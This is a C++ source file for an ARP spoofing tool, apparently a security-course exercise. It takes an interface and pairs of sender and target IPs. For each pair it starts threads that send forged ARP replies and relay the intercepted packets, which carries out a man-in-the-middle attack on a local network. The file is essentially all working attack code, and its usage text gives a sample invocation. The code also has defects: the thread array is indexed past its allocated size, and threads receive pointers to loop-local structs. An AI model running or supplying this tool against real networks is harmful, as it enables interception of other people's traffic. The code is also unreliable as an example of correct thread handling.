#include <cstdio>
#include <pcap.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>

#include "ethhdr.h"
#include "arphdr.h"
#include "util.h"
#include "attack.h"

static volatile bool running = true;

void usage();
void signal_handler(int signal);

int main(int argc, char* argv[]) {
    char *dev;
    Mac attacker_mac;
    Ip attacker_ip;
    pthread_t *threads;


    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    dev = argv[1];

    if (
        getMacFromInterface(dev, &attacker_mac) ||
        getIpFromInterface(dev, &attacker_ip)
    ) {
        fprintf(stderr, "getMacFromInterface or getIpFromInterface error\n");
        return -1;
    }

    signal(SIGINT, signal_handler);
    threads = (pthread_t *)malloc(sizeof(pthread_t) * (argc - 2));
    if (threads == NULL) {
        fprintf(stderr, "malloc error\n");
        return -1;
    }

    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i + 1]);
        Mac sender_mac;
        if (getMacFromIP(dev, &attacker_mac, &attacker_ip, &sender_ip, &sender_mac)) {
            fprintf(stderr, "getMacFromIP error\n");
            return -1;
        }

        SendArpReplyArgs send_arp_reply_args = { &running, dev, &attacker_mac, &attacker_ip, &sender_mac, &sender_ip, &target_ip };
        if (pthread_create(&threads[i], NULL, sendArpReply, (void *)&send_arp_reply_args)) {
            fprintf(stderr, "pthread_create error\n");
            return -1;
        }

        RelayPacketArgs relay_packet_args = { &running, dev, &attacker_mac, &sender_mac };
        if (pthread_create(&threads[i+1], NULL, relayPacket, (void *)&relay_packet_args)) {
            fprintf(stderr, "pthread_create error\n");
            return -1;
        }
    }

    for (int i = 2; i < argc; i++) {
        pthread_join(threads[i], NULL);
    }
    free(threads);
}

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void signal_handler(int signal) {
    running = false;
}
